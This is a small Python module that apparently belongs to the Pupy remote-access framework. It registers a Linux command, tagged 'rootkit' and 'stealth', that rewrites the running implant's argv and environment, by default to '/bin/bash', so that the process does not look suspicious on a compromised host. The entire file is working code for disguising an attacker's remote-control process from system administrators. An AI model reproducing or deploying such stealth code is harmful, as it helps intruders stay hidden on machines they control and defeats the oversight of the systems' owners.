# -*- coding: UTF8 -*-
from pupylib.PupyModule import *

__class_name__="HideProcessModule"

@config(compat="linux", cat="manage", tags=["hide", "rootkit", "stealth"])
class HideProcessModule(PupyModule):
    """ Edit current process argv & env not to look suspicious """
    dependencies=["pupystealth"]

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="hide_process", description=self.__doc__)
        self.arg_parser.add_argument('--argv', default="/bin/bash", help='change the new process argv')

    def run(self, args):
        self.client.conn.modules['pupystealth.change_argv'].change_argv(argv=args.argv)
        self.success("process argv and env changed !")

